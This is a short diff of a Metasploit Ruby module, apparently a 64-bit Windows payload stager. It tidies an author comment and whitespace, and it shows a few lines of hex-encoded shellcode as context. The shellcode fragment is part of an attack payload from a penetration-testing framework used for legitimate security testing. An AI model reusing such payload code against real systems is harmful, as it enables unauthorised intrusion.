@@ -22,7 +22,7 @@ module Metasploit3
 			'Author'        => [
 				'hdm', # original 32-bit implementation
 				'agix', # x64 rewrite
-                                'rwincey' # x64 fixup
+        'rwincey' # x64 alignment fix
 			],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'win',
@@ -86,7 +86,7 @@ module Metasploit3
 						"\x48\x89\xF1\x48\x89\xDA\x49\xB8\x00\x20\x00\x00\x00\x00\x00\x00" +
 						"\x49\x89\xF9\x49\xBA\x12\x96\x89\xE2\x00\x00\x00\x00\xFF\xD5\x48" +
 						"\x83\xC4\x20\x85\xC0\x74\x99\x48\x8B\x07\x48\x01\xC3\x48\x85\xC0" +
-						"\x75\xCE\x58\x58\xC3" + 
+						"\x75\xCE\x58\x58\xC3" +
 						"\xE8\xD7\xFE\xFF\xFF" #updated jump offset
 				}
 			))
